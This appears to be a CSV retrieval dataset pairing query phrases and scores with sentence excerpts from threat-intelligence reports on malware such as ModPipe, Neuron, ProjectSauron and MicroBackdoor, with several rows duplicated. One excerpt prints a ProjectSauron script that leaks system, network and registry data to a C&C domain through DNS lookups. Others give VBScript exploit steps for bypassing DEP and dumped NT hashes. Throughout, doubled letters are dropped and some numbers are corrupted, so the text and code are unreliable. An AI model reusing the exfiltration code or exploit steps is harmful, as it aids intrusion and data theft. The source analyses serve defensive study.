466c2154d2a970279cbacddb0f4d1773,encryption,0.8336321668492042,"['But the number of representational posibilities available to a quantum computer expands exponentialy (thre qubits have 2^3, or eight states, four qubits have 2^4, or 16 states, etc.).', 'And thats just the start.', 'Qudits (the d representing a variable number of dimensions) take this concept even further.', 'In 2017, for example, scientists at the National Institute of Scientific Research constructed a pair of qudits with 10 diferent states each, providing more computational power than six qubits.', 'Compound that by milions of qubits (or qudits), and the potential computational power of a quantum computer sems limitles.', 'From a cybersecurity perspective, quantum computers wil play a potentialy devastating role in undermining the efectivenes of things like data encryption.', 'Quantum computers wil quickly render asymetric encryption algorithms obsolete.', '(These are the algorithms used to sign information to ensure data integrity, perform key exchanges to enable confidentiality algorithms to scramble data, and to verify authenticity of people or data.)', 'In fact, it is being predicted that quantum computers wil break eliptical curve cryptography by 2027.', '6 WHITE PAPER | Cyber Threat Predictions for 2021 Of course, quantum computers are not curently comercialy available, at least not to the usual asortment of cyber criminals most organizations are concerned with.', 'However, they stil have one colosal benefactornation-states.']"
8eb1f16e59328363d2929e47b8c6c819,encryption,1.0,"['2 Introduction .', '4 Sumary of changes .', '4 Neuron Updates .', '5 Loader .', '5 Payload .', '6 Encryption .', '6 Comunications .', '6 Asociated Files .', '6 Neuron Yara .', '7 TLP WHITE Page 3 of 8 TLP WHITE Introduction In November 2017, the NCSC released an advisory highlighting the Turla Groups use of the tols Neuron and Nautilus.1 Since then, the NCSC has identified a new version of the Neuron malware.', 'The new version has ben modified to evade previous detection methods.']"
8eb1f16e59328363d2929e47b8c6c819,encryption,1.0,"['2 Introduction .', '4 Sumary of changes .', '4 Neuron Updates .', '5 Loader .', '5 Payload .', '6 Encryption .', '6 Comunications .', '6 Asociated Files .', '6 Neuron Yara .', '7 TLP WHITE Page 3 of 8 TLP WHITE Introduction In November 2017, the NCSC released an advisory highlighting the Turla Groups use of the tols Neuron and Nautilus.1 Since then, the NCSC has identified a new version of the Neuron malware.', 'The new version has ben modified to evade previous detection methods.']"
5781b38155642213a5742de08d81aefc,encryption,0.8336321668492042,"['4-5 Figure A-1.', 'Anex C, Apendix 12 .A-16 Figure D-1.', 'Cyber mision force team alocations .', 'D-6 Figure D-2.', 'National electromagnetic spectrum operations organizational structure.', '.', 'D-9 Figure E-1.', 'Routing proces when requesting ofensive cyberspace operations suport .E-3 Figure E-2.', 'Routing proces when requesting defensive cyberspace operations-internal defensive measures suport .E-5 Figure E-3.', 'Routing proces for defensive cyberspace operations-internal defensive measures (non-Department of Defense information network) and defensive cyberspace operations-response actions suport.E-6 Figure E-4.', 'Joint tactical airstrike request form.']"
cbc4ac68f5373159751e25d3110f9ddc,encryption,0.7669039515735961,"['TLP:WHITE IDENTIFICATION OF A NEW CYBER CRIMINAL GROUP: LOCKEAN Version1.0 October26,2021 TLP:WHITE TLP:WHITE Identificationofanewcybercriminalgroup: Lockean Table of contents 1 Context: linksbetwenseveralincidentswithintheFrenchremit .', '.', '.', '.', '.', '.', '.']"
caaf54f566e7989273f85f3676e4df50,encryption,1.0,"['However, the data on any other drives is easily acesible.', 'cd ~/Downloads In the past, I have encouraged readers to create an encrypted VeraCrypt adb instal com.anonyome.', 'container on the external drives and mysudo_1.8.0-13894_ store al data securely within it.', 'This is minAPI24(x86_64)(nodpi)_ stil valid advice, but there are other apkmiror.com options.', 'Lately, I have ben relying You should now se the MySudo on Linux Unified Key Setup (LUKS) for aplication within the Anbox emulator.', 'encryption.', 'From within Pop!_OS or However, I want a traditional program many other Linux builds, open the Disks icon within my aplications menu.', 'I aplication, select the target drive, click executed the folowing within Terminal.', 'the setings icon, chose the Format Partition option, select the internal ln -s ~/snap/anbox/comon/ Ext4 option, enable the Pasword ap-data/aplications/anbox protect volume feature, and asign ~/.local/share/aplications/ a very secure pasword.', 'The entire anbox external drive is now encrypted.', 'The benefit is that you do not ned third- I can now ad the MySudo icon to party decryption software to aces my Dock and execute a traditional your data.']"
70ee9e13629aefa743b537272c6774d3,"unpacks and loads the next stage of the malware, namely the main module",0.9095455978900662,"['Acording to the documentation, to achieve this the atackers would have to reverse enginer the generation proces of the site-specific pasphrase, which is used to derive the encryption key for sensitive data.', 'This proces would then have to be implemented into the module and due to use of the Windows Data Protection API (DPAPI) executed directly on the victims machine.', 'Another remaining unknown is ModPipes distribution method.', 'The majority of the identified targets were from the United States, with indications that they were in the restaurant and hospitality sectors the primary customers of RES 370 POS.', 'ModPipe architecture Our analysis shows that ModPipe uses modular architecture consisting of basic components and downloadable modules (for a beter overview se Figure 1): 1. initial droper contains both 32-bit and 64-bit binaries of the next stage the persistent loader and instals the apropriate version to the compromised machine.', '2. persistent loader unpacks and loads the next stage of the malware, namely the main module.', '3. main module performs the main functionality of the malware.', 'It creates a pipe used for comunication with other malicious modules, un/instals these modules and serves as a dispatcher that handles comunication betwen the modules and atackers C&C server.', '4. networking module module used for comunication with C&C.', '5. downloadable modules components ading specific functionality to the backdor, such as the ability to steal database paswords and configuration information, scan specific IP adreses or acquire a list of the runing proceses and their loaded modules.', 'htps:/w.welivesecurity.com/2020/1/12/hungry-data-modpipe-backdor-hits-pos-software-hospitality-sector/ 2/2 1/13/2020 Hungry for data, ModPipe backdor hits POS software used in hospitality sector | WeLiveSecurity Figure 1.']"
70ee9e13629aefa743b537272c6774d3,"unpacks and loads the next stage of the malware, namely the main module",0.9095455978900662,"['Acording to the documentation, to achieve this the atackers would have to reverse enginer the generation proces of the site-specific pasphrase, which is used to derive the encryption key for sensitive data.', 'This proces would then have to be implemented into the module and due to use of the Windows Data Protection API (DPAPI) executed directly on the victims machine.', 'Another remaining unknown is ModPipes distribution method.', 'The majority of the identified targets were from the United States, with indications that they were in the restaurant and hospitality sectors the primary customers of RES 370 POS.', 'ModPipe architecture Our analysis shows that ModPipe uses modular architecture consisting of basic components and downloadable modules (for a beter overview se Figure 1): 1. initial droper contains both 32-bit and 64-bit binaries of the next stage the persistent loader and instals the apropriate version to the compromised machine.', '2. persistent loader unpacks and loads the next stage of the malware, namely the main module.', '3. main module performs the main functionality of the malware.', 'It creates a pipe used for comunication with other malicious modules, un/instals these modules and serves as a dispatcher that handles comunication betwen the modules and atackers C&C server.', '4. networking module module used for comunication with C&C.', '5. downloadable modules components ading specific functionality to the backdor, such as the ability to steal database paswords and configuration information, scan specific IP adreses or acquire a list of the runing proceses and their loaded modules.', 'htps:/w.welivesecurity.com/2020/1/12/hungry-data-modpipe-backdor-hits-pos-software-hospitality-sector/ 2/2 1/13/2020 Hungry for data, ModPipe backdor hits POS software used in hospitality sector | WeLiveSecurity Figure 1.']"
74d95823facffdc61cf1a73f5d1177a1,upload data to C&C,0.8259861125247075,"['Although our analysis and atribution eforts are ongoing, we have discovered some indicators that sugest the threat actor may be a Chinese group.', 'The campaigns The APT group has launched at least four campaigns since late February, using a variety of lures, detailed below.', '1.', 'Interactive map of Ukraine The threat actor started this campaign around February 26, 202, and distributed its custom malware with the name interactive_map_UA.exe, trying to disguise it as an interactive map of Ukraine.', 'This campaign began a few days after Rusia invaded Ukraine, which shows the threat actor was monitoring the situation betwen Ukraine and Rusia and tok advantage of it to lure targets in Rusia.', '2.', 'Log4j patch In this campaign the threat actor packaged its custom malware in a tar file caled Patch_Log4j.tar.gz, a fake fix for Decembers high-profile Log4j vulnerability.', 'This campaign ran in early March and was primarily aimed at RT TV (formerly Rusia Today or Rosiya Segodnya, a Rusian state-controled international television network funded by the Rusian government).', 'The APT group had aces to almost 10 RT TV employes email adres.', 'The emails were sent with the subject .', '.']"
8183537fe00a7b3c94c46bdee14b79a1,upload data to C&C,0.7689598326749838,"['The C2 reply only contains the external IP adres of the implant.', 'The malware recognizes the folowing comand codes/names sent by the C2 servers to execute coresponding actions on the infected system: Comand name Capability deleteme Delete itself from the system using a BAT file.', 'download Download files from a specified remote location.', 'rename Rename files on the system.', 'iamslep Instructs the implant to go to slep for a specified amount of time.', 'upload Upload files to C2.', 'showurls Empty comand (Not implemented yet).', 'Ilustrating operation Blacksmith This particular atack observed by Talos involves the sucesful exploitation of CVE-2021-428, also known as Log4Shel, on publicly facing VMWare Horizon servers, as a means of initial aces to vulnerable public- 7/12 facing servers.', 'Preliminary reconaisance folows the initial aces leading to the deployment of a custom- made implant on the infected system.', 'Typical Infection chain observed in Operation Blacksmith.', 'Phase 1: Initial reconaisance by Lazarus Lazarus initial aces begins with sucesful exploitation of CVE-2021-428, the infamous Log4j vulnerability discovered in 2021.']"
55a24b6a8af86c07248bfb737205b930,upload data to C&C,0.7791950429451462,"['JSON results sh_obj sent to the C2 server with code value 1 and args indicating the results.', 'Send contents of keyloger bufer and clipboard data.', 'Reports to C2 server with JSON code sh_clip value 3 and args containing the colected data.', '9/17 sh_run Downloads and runs the browser stealer component.', 'Reports to C2 server with JSON code value 4 and args containing the file path for this component.', 'Upload data to a C2 server.', 'Subcomands include: Upload al contents of a specific directory.', 'Upload specific files.', 'Upload files matching a given patern loking recursively in a given folder.', 'Contents are uploaded to an actor-controled FTP server, provided in the JSON response using the folowing args: sh_upload hn: FTP host.', 'un: Username.']"
2deb306cdb63e3244e00bbb0b6337d93,Windows registry Run key,0.8688730985471036,"[']online:843 185[.', ']175.158.27 : 1/2 %PUBLIC%\\ignit.vbs %PUBLIC%\\Favorites\\desktop.ini %PUBLIC%\\Libraries\\core.dl %APDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Windows Prefetch.lNk wscript.exe /B /E:vbs C:\\Users\\Public\\Favorites\\desktop.ini C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U C:\\Users\\Public\\Libraries\\core.dl MicroBackdor is a publicly available backdor program developed using the C + programing language.', 'Author: cr4sh (aka Dmytro Oleksiuk).', 'Functional: id, info, ping, exit, upd, uninst, exec, shel, flist, fget, fput, screnshot (implemented separately by members of the group UAC-051 / unc151).', 'The server part is designed using the Python programing language and provides a simple web interface for managing bots.', 'Persistence: Run Windows Registry Key.', 'Comunication betwen the bot and the server is encrypted using RC4.', 'Graphic images Fig.', '1 Example of malicious files and image baits 2/2']"
854ae43107ecc9eb18c9feff733c98ed,GetTickCount Windows API,0.8343468817732173,"['Uses GetTempPathA, SetCurentDirectoryA APIs.', 'dev - Returns the list of drives in the system with their type (fixed, removable, etc).', 'The folowing strings are used for their types: unk, nrt, rmv, fix, net, cdr, ram, und.', 'Uses GetLogicalDriveStringsA, GetDriveTypeA apis.', 'time - Gets the number of hours since the system was started: ""uptime %5d.%02dh.', 'Uses GetTickCount api.', 'info - Gets info about system.', 'String generated like: ""%d %s\\n%s\\ %s\\"" using GetCurentProcesId, GetModuleFileNameA, GetComputerNameA, GetUserNameA apis.', 'exit - ""exiting.""', 'dir, ls - List files in curent dir.', 'Uses FindFirstFile(""*""), FindNextFile apis.']"
854ae43107ecc9eb18c9feff733c98ed,GetTickCount Windows API,0.8343468817732173,"['Uses GetTempPathA, SetCurentDirectoryA APIs.', 'dev - Returns the list of drives in the system with their type (fixed, removable, etc).', 'The folowing strings are used for their types: unk, nrt, rmv, fix, net, cdr, ram, und.', 'Uses GetLogicalDriveStringsA, GetDriveTypeA apis.', 'time - Gets the number of hours since the system was started: ""uptime %5d.%02dh.', 'Uses GetTickCount api.', 'info - Gets info about system.', 'String generated like: ""%d %s\\n%s\\ %s\\"" using GetCurentProcesId, GetModuleFileNameA, GetComputerNameA, GetUserNameA apis.', 'exit - ""exiting.""', 'dir, ls - List files in curent dir.', 'Uses FindFirstFile(""*""), FindNextFile apis.']"
70ee9e13629aefa743b537272c6774d3,downloaded from the C&C along with the ModScan module,0.804504777872173,"['It is either: 1. downloaded from the C&C along with the ModScan module, or 2. received during runtime, using the named pipe asociated with the ModScan module.', 'The ModScan module handles pipe comands listed in Table 2.', 'Table 2.', 'ModScan 2.20 module pipe comands Comand name Comand description htps:/w.welivesecurity.com/2020/1/12/hungry-data-modpipe-backdor-hits-pos-software-hospitality-sector/ 7/2 1/13/2020 Hungry for data, ModPipe backdor hits POS software used in hospitality sector | WeLiveSecurity Comand name Comand description exit Exit stop Terminate scaning threads scan Start scaning IPs specified in the comand data to colect aditional in- formation about the environment prm Specify special ping IP adres Scaning procedure routine 1.', 'Before scaning, the module sends a special ping mesage containing a 32-bit value generated by the GetTickCount Windows API function to TCP ports 50123 (used by MDS HTP Service) and 2638 (used by SAP Sybase database server) of the ping IP adres.', '2.', 'The response from the ping IP adres should contain the same 32-bit value rotated right by one bit and XORed with the value 0x6CF6B8A8.', 'If the response on at least one of the ports provides the apropriate value, the module wil start the scan of the selected IP adreses.', 'A decompilation of this ping function is shown in Figure 4.', 'Figure 4.', 'Hex-Rays decompiled code of the ModScan ping functionality 3.']"
70ee9e13629aefa743b537272c6774d3,downloaded from the C&C along with the ModScan module,0.804504777872173,"['It is either: 1. downloaded from the C&C along with the ModScan module, or 2. received during runtime, using the named pipe asociated with the ModScan module.', 'The ModScan module handles pipe comands listed in Table 2.', 'Table 2.', 'ModScan 2.20 module pipe comands Comand name Comand description htps:/w.welivesecurity.com/2020/1/12/hungry-data-modpipe-backdor-hits-pos-software-hospitality-sector/ 7/2 1/13/2020 Hungry for data, ModPipe backdor hits POS software used in hospitality sector | WeLiveSecurity Comand name Comand description exit Exit stop Terminate scaning threads scan Start scaning IPs specified in the comand data to colect aditional in- formation about the environment prm Specify special ping IP adres Scaning procedure routine 1.', 'Before scaning, the module sends a special ping mesage containing a 32-bit value generated by the GetTickCount Windows API function to TCP ports 50123 (used by MDS HTP Service) and 2638 (used by SAP Sybase database server) of the ping IP adres.', '2.', 'The response from the ping IP adres should contain the same 32-bit value rotated right by one bit and XORed with the value 0x6CF6B8A8.', 'If the response on at least one of the ports provides the apropriate value, the module wil start the scan of the selected IP adreses.', 'A decompilation of this ping function is shown in Figure 4.', 'Figure 4.', 'Hex-Rays decompiled code of the ModScan ping functionality 3.']"
17b783a70edf2d901c8201d322f6289a,create a new service for persistence.,0.7565473844655103,"['There is a unique feature that can also be found in other scripts packaged with the platform: during execution it performs DNS requests to semingly random subdomain names of the log C&C domain (bikesport.com), and each subdomain request is efectively a realtime status update that can be loged and analzyzed by the atackers.', 'The script was modified to remove sensitive information.', 'externalmail = ""74.125.148.1"" relayPort = ""43"" relayServer = ""217.160.176.157"" mailto = ""x.x.x@gmail.com"" mailSubject = ""Regarding your ofer"" mailBody = ""This is to inform you that I decline your ofer.', 'Se atachment.\\n Best Regards x"" domain = ""bikesport.com"" smtport = "" smtpserver = "" mail = function(l_1_0, l_1_1, l_1_2, l_1_3, l_1_4) bufer = "" id1 = string.uper(string.format(""%04x%04x"", math.random(4369, 6535), math.random(0, 6535) id2 = string.format(""%07u"", math.random(0, 9) boundary = string.format(""-%06u%06u%06u%06u"", math.random(0, 9), math.random(0, 9), math.random(0, 9), math.random(0, 9) delimiter = ""\\r\\n"" endOfRow = ""\\r\\n"" startBoundary = string.format(""-%s"", boundary) endBoundary = string.format(""%s%s-%s"", endOfRow, startBoundary, endOfRow) bufer = string.format(""%sMesage-ID: <%s.%s@localhost.localdomain>%s"", bufer, id1, id2, endOfRow) bufer = string.format(""%sFrom: <%s>%s"", bufer, l_1_1, endOfRow) bufer = string.format(""%sUser-Agent: Thunderbird 2.0.0.9 (Windows/2071031)%s"", bufer, endOfRow) bufer = string.format(""%sMIME-Version: 1.0%s"", bufer, endOfRow) bufer = string.format(""%sTo: %s%s"", bufer, l_1_0, endOfRow) bufer = string.format(""%sSubject: %s%s"", bufer, l_1_2, endOfRow) bufer = string.format(""%sContent-Type: multipart/mixed;%s boundary=\\""%s\\""%s"", bufer, endOfRow, boundary, endOfRow) bufer = string.format(""%s%s"", bufer, endOfRow) bufer = string.format(""%sThis is a multi-part mesage in MIME format.%s%s%s"", bufer, endOfRow, startBoundary, endOfRow) bufer = string.format(""%sContent-Type: text/plain; charset=ISO-859-1; format=flowed%s"", bufer, endOfRow) bufer = string.format(""%sContent-Transfer-Encoding: 7bit%s%s"", bufer, endOfRow, endOfRow) bufer = string.format(""%s%s%s"", bufer, l_1_3, endOfRow) bufer = string.format(""%s%s%s%s"", bufer, endOfRow, startBoundary, endOfRow) bufer = string.format(""%sContent-Type: aplication/x-msdownload;\\r\\n name=\\""data.bin\\""%s"", bufer, endOfRow) bufer = string.format(""%sContent-Transfer-Encoding: base64%s"", bufer, endOfRow) bufer = string.format(""%sContent-Disposition: atachment;\\r\\n filename=\\""data.bin\\""%s%s"", bufer, endOfRow, endOfRow) strLen = string.len(l_1_4) index = 1 repeat if index < strLen then istart = index index = index + 72 iend = index - 1 For any inquiries, contact intelreports@kaspersky.com Page 26 of 3 The ProjectSauron APT.', 'Technical analysis if strLen < iend then iend = strLen end bufer = string.format(""%s%s%s"", bufer, string.sub(l_1_4, istart, iend), endOfRow) else bufer = string.format(""%s%s"", bufer, endBoundary) return bufer end end end systemcheck = function() w.exec(""sinfo"") execStr = string.format(""sinfo | basex -b 32url | dext -l 30 a.""', '.', 'domain . ""', '| nslu -"") res = w.exec2str(execStr) w.exec(""netnfo -A"") execStr = string.format(""netnfo -irc | basex -b 32url | dext -l 30 c."" .', 'domain . ""', '| nslu -"") res = w.exec2str(execStr) w.exec2str(""su -t explorer.exe"") w.exec(""regedit -a \\""\\HKCU\\Software\\Microsoft\\Windows\\CurentVersion\\Internet Setings\\"") execStr = string.format(""regedit -a \\""\\HKCU\\Software\\Microsoft\\Windows\\CurentVersion\\Internet Setings\\"" | basex -b 32url | dext -l 30 d."" .', 'domain . ""']"
17b783a70edf2d901c8201d322f6289a,create a new service for persistence.,0.7565473844655103,"['There is a unique feature that can also be found in other scripts packaged with the platform: during execution it performs DNS requests to semingly random subdomain names of the log C&C domain (bikesport.com), and each subdomain request is efectively a realtime status update that can be loged and analzyzed by the atackers.', 'The script was modified to remove sensitive information.', 'externalmail = ""74.125.148.1"" relayPort = ""43"" relayServer = ""217.160.176.157"" mailto = ""x.x.x@gmail.com"" mailSubject = ""Regarding your ofer"" mailBody = ""This is to inform you that I decline your ofer.', 'Se atachment.\\n Best Regards x"" domain = ""bikesport.com"" smtport = "" smtpserver = "" mail = function(l_1_0, l_1_1, l_1_2, l_1_3, l_1_4) bufer = "" id1 = string.uper(string.format(""%04x%04x"", math.random(4369, 6535), math.random(0, 6535) id2 = string.format(""%07u"", math.random(0, 9) boundary = string.format(""-%06u%06u%06u%06u"", math.random(0, 9), math.random(0, 9), math.random(0, 9), math.random(0, 9) delimiter = ""\\r\\n"" endOfRow = ""\\r\\n"" startBoundary = string.format(""-%s"", boundary) endBoundary = string.format(""%s%s-%s"", endOfRow, startBoundary, endOfRow) bufer = string.format(""%sMesage-ID: <%s.%s@localhost.localdomain>%s"", bufer, id1, id2, endOfRow) bufer = string.format(""%sFrom: <%s>%s"", bufer, l_1_1, endOfRow) bufer = string.format(""%sUser-Agent: Thunderbird 2.0.0.9 (Windows/2071031)%s"", bufer, endOfRow) bufer = string.format(""%sMIME-Version: 1.0%s"", bufer, endOfRow) bufer = string.format(""%sTo: %s%s"", bufer, l_1_0, endOfRow) bufer = string.format(""%sSubject: %s%s"", bufer, l_1_2, endOfRow) bufer = string.format(""%sContent-Type: multipart/mixed;%s boundary=\\""%s\\""%s"", bufer, endOfRow, boundary, endOfRow) bufer = string.format(""%s%s"", bufer, endOfRow) bufer = string.format(""%sThis is a multi-part mesage in MIME format.%s%s%s"", bufer, endOfRow, startBoundary, endOfRow) bufer = string.format(""%sContent-Type: text/plain; charset=ISO-859-1; format=flowed%s"", bufer, endOfRow) bufer = string.format(""%sContent-Transfer-Encoding: 7bit%s%s"", bufer, endOfRow, endOfRow) bufer = string.format(""%s%s%s"", bufer, l_1_3, endOfRow) bufer = string.format(""%s%s%s%s"", bufer, endOfRow, startBoundary, endOfRow) bufer = string.format(""%sContent-Type: aplication/x-msdownload;\\r\\n name=\\""data.bin\\""%s"", bufer, endOfRow) bufer = string.format(""%sContent-Transfer-Encoding: base64%s"", bufer, endOfRow) bufer = string.format(""%sContent-Disposition: atachment;\\r\\n filename=\\""data.bin\\""%s%s"", bufer, endOfRow, endOfRow) strLen = string.len(l_1_4) index = 1 repeat if index < strLen then istart = index index = index + 72 iend = index - 1 For any inquiries, contact intelreports@kaspersky.com Page 26 of 3 The ProjectSauron APT.', 'Technical analysis if strLen < iend then iend = strLen end bufer = string.format(""%s%s%s"", bufer, string.sub(l_1_4, istart, iend), endOfRow) else bufer = string.format(""%s%s"", bufer, endBoundary) return bufer end end end systemcheck = function() w.exec(""sinfo"") execStr = string.format(""sinfo | basex -b 32url | dext -l 30 a.""', '.', 'domain . ""', '| nslu -"") res = w.exec2str(execStr) w.exec(""netnfo -A"") execStr = string.format(""netnfo -irc | basex -b 32url | dext -l 30 c."" .', 'domain . ""', '| nslu -"") res = w.exec2str(execStr) w.exec2str(""su -t explorer.exe"") w.exec(""regedit -a \\""\\HKCU\\Software\\Microsoft\\Windows\\CurentVersion\\Internet Setings\\"") execStr = string.format(""regedit -a \\""\\HKCU\\Software\\Microsoft\\Windows\\CurentVersion\\Internet Setings\\"" | basex -b 32url | dext -l 30 d."" .', 'domain . ""']"
2deb306cdb63e3244e00bbb0b6337d93,use Registry Run key for persistence,0.8332298921656051,"[']online:843 185[.', ']175.158.27 : 1/2 %PUBLIC%\\ignit.vbs %PUBLIC%\\Favorites\\desktop.ini %PUBLIC%\\Libraries\\core.dl %APDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Windows Prefetch.lNk wscript.exe /B /E:vbs C:\\Users\\Public\\Favorites\\desktop.ini C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U C:\\Users\\Public\\Libraries\\core.dl MicroBackdor is a publicly available backdor program developed using the C + programing language.', 'Author: cr4sh (aka Dmytro Oleksiuk).', 'Functional: id, info, ping, exit, upd, uninst, exec, shel, flist, fget, fput, screnshot (implemented separately by members of the group UAC-051 / unc151).', 'The server part is designed using the Python programing language and provides a simple web interface for managing bots.', 'Persistence: Run Windows Registry Key.', 'Comunication betwen the bot and the server is encrypted using RC4.', 'Graphic images Fig.', '1 Example of malicious files and image baits 2/2']"
12751bf826c4c00e85c6052b44d3b364,encoded malware,0.7954884357311357,"['Atack flow of KiraV2 Report 10 5 Key Features per Phase a. Bot .', 'a.1.', 'Reset: Mirai and KiraV2 encode and store most of the strings, including the C&C server adres, and decrypt the strings for future use.', 'To do this, they first reset the encoded strings.', 'There are also other routines in which the strings can be executed via the analysis disruption technique and daemon proces.', '.', 'a.2.', 'Kep Alive: Prevents system rebot via watchdog.', '.', 'a.3.', 'Terminates Other Malware: Searches for proces name and delete proceses with specific names of the existing malware.']"
fde99aec52569c70a0f1c5f8d5b2eca6,Windows Management Instrumentation (WMI).,0.8567486350699459,"['ESET Research White papers / October 2019 OPERATION GHOST The Dukes arent back they never left Mathieu Faou Mathieu Tartare Thomas Dupuy TABLE OF CONTENTS 1.', 'Executive sumary .', '.', '.', '.', '.', '.', '.']"
fde99aec52569c70a0f1c5f8d5b2eca6,Windows Management Instrumentation (WMI).,0.8567486350699459,"['ESET Research White papers / October 2019 OPERATION GHOST The Dukes arent back they never left Mathieu Faou Mathieu Tartare Thomas Dupuy TABLE OF CONTENTS 1.', 'Executive sumary .', '.', '.', '.', '.', '.', '.']"
5300cfd53bf031f9c4870551702274ee,Windows Management Instrumentation (WMI).,0.8009961518182371,"['Its mainly used by red teams in IT security but also misused acros the spectrum of APT actors, e.g.', 'Lazarus Group, Telebots, Okrum etc.', 'After runing it in a test virtual environment, its output is (the incorect spaces before the comas are in the original): 1 #1 domain = MSEDGEWIN10, user = Administrator , nthash=FC525C9683E8FE067095BA2DC97189.', '2 #2 domain = MSEDGEWIN10, user = IEUser , nthash=FC525C9683E8FE067095BA2DC97189.', 'Lateral movement via WMI The atackers use an aditional tol to spread in the hosting network.', 'This time they leverage Windows Management Instrumentation (WMI).', 'Al relevant data is neded as the files name, as during the execution it expects @<ComputerName>,<UserName>,<Pasword>,.exe.', 'In the first step, a console to a remote computer is established, where the conection is identified by <ComputerName> and authenticated with (<UserName>, <Pasword>).', 'Afterwards, proxy htps:/w.welivesecurity.com/2020/05/14/mikrocen-spying-backdor-high-profile-networks-central-asia/ 3/7 5/15/2020 Mikrocen: Spying backdor leveraged in high-profile networks in Central Asia | WeLiveSecurity security is set to the strict level, which means arguments of each remote procedure cal are encrypted and the servers aces to local resources is alowed.', 'Then WMI is used again to retrieve the Win32_Proces clas, which in turn is used to create a proces with given parameters.', 'When al the work is done, the tol terminates itself.']"
5300cfd53bf031f9c4870551702274ee,Windows Management Instrumentation (WMI).,0.8009961518182371,"['Its mainly used by red teams in IT security but also misused acros the spectrum of APT actors, e.g.', 'Lazarus Group, Telebots, Okrum etc.', 'After runing it in a test virtual environment, its output is (the incorect spaces before the comas are in the original): 1 #1 domain = MSEDGEWIN10, user = Administrator , nthash=FC525C9683E8FE067095BA2DC97189.', '2 #2 domain = MSEDGEWIN10, user = IEUser , nthash=FC525C9683E8FE067095BA2DC97189.', 'Lateral movement via WMI The atackers use an aditional tol to spread in the hosting network.', 'This time they leverage Windows Management Instrumentation (WMI).', 'Al relevant data is neded as the files name, as during the execution it expects @<ComputerName>,<UserName>,<Pasword>,.exe.', 'In the first step, a console to a remote computer is established, where the conection is identified by <ComputerName> and authenticated with (<UserName>, <Pasword>).', 'Afterwards, proxy htps:/w.welivesecurity.com/2020/05/14/mikrocen-spying-backdor-high-profile-networks-central-asia/ 3/7 5/15/2020 Mikrocen: Spying backdor leveraged in high-profile networks in Central Asia | WeLiveSecurity security is set to the strict level, which means arguments of each remote procedure cal are encrypted and the servers aces to local resources is alowed.', 'Then WMI is used again to retrieve the Win32_Proces clas, which in turn is used to create a proces with given parameters.', 'When al the work is done, the tol terminates itself.']"
9dfd4e4ee0b137307871d958fcbbc521,Windows Management Instrumentation (WMI).,0.8539446285641696,"['1 Technical Details .', '4 Background .', '4 Artifacts .', '4 Network artifacts .', '4 Host artifacts .', '5 Windows management instrumentation (WMI/WMIC) .', '5 Ntds.dit Active Directory database .', '5 PortProxy .', '8 PowerShel .', '10 Impacket .', '10 Enumeration of the environment .']"
c535fe3c1b9e7485ff2a5fa8766d741b,The decryption algorithm,0.7791055362100768,"['If the input argument is adr(0x1234), first ad 4 to the value to get 0x12348, and then set the variant type to 8 (string type).', 'Next, cal len function: if found to be BSTR type, vbscript wil asume that the forward 4 bytes (0x1234) is the adres memory to store the length.', 'So the len function wil be executed and the value of the specified memory adres wil be returned.', 'Obtain Key DL Base Adres 1.', 'The atacker leaks the virtual function table adres of the CScriptEntryPoint object in the folowing way, which belongs to Vbscript.dl.', '1.', 'Obtain the vbscript.dl base adres in the folowing way.', '1.', 'Because vbscript.dl imported msvcrt.dl, the msvcrt.dl base adres was obtained by traversing the vbscript.dl import table, msvcrt.dl introduces kernelbase.dl, ntdl.dl, and finaly the NtContinue, VirtualProtect function adres was obtained.', 'Save web pages as PDF with PDFmyURL Bypas DEP to execute shelcode 1.', 'Use arbitrary reading and writing technique to modify the VAR type type to 0x4d, and then asign it with a value of 0 to make the virtual machine perform VAR: Clear function.']"
c535fe3c1b9e7485ff2a5fa8766d741b,The decryption algorithm,0.7791055362100768,"['If the input argument is adr(0x1234), first ad 4 to the value to get 0x12348, and then set the variant type to 8 (string type).', 'Next, cal len function: if found to be BSTR type, vbscript wil asume that the forward 4 bytes (0x1234) is the adres memory to store the length.', 'So the len function wil be executed and the value of the specified memory adres wil be returned.', 'Obtain Key DL Base Adres 1.', 'The atacker leaks the virtual function table adres of the CScriptEntryPoint object in the folowing way, which belongs to Vbscript.dl.', '1.', 'Obtain the vbscript.dl base adres in the folowing way.', '1.', 'Because vbscript.dl imported msvcrt.dl, the msvcrt.dl base adres was obtained by traversing the vbscript.dl import table, msvcrt.dl introduces kernelbase.dl, ntdl.dl, and finaly the NtContinue, VirtualProtect function adres was obtained.', 'Save web pages as PDF with PDFmyURL Bypas DEP to execute shelcode 1.', 'Use arbitrary reading and writing technique to modify the VAR type type to 0x4d, and then asign it with a value of 0 to make the virtual machine perform VAR: Clear function.']"
fcef139433bae54ea996aa09f7e1fcf4,decryption function.,0.8506039784321054,"['The executables were sen with the filenames ""Update.exe"", ""ntfsc.exe"" or ""nx"" in this campaign.', 'They are either downloaded or droped into the victim\'s ""local aplication data"" folder and run as a Windows Security update with medium integrity to elevate the privileges of a standard user.', 'The actor uses comon encoding techniques to obfuscate strings in the WinMain function to hide its behavior from static analysis tols.', 'WinMain function snipet.', 'The decryption function receives the encrypted strings and decrypts each character with the XOR operation and stores the result in an aray that wil be returned to the caler function.', '1/19 Decryption function.', ""The malware searches for the Windows Defender and Kaspersky antivirus proceses in the victim's machine by creating the snapshot of runing proceses using CreateTolhelp32Snapshot and iterates through each proces using API Proces32First and Proces32Next."", 'WinMain() snipet showing antivirus proces detection.', ""12/19 The information-gathering function gathers the victim's hostname, operating system product name, and the victim's username and writes them into a memory bufer."", 'Information-gathering function.', 'The C2 comunicating function at ofset 401C50 is caled from the two other requests making functions to send the victim\'s information with the decrypted strings ""xnb/dxagt5avb2.php?txt="" and ""data1.php?']"
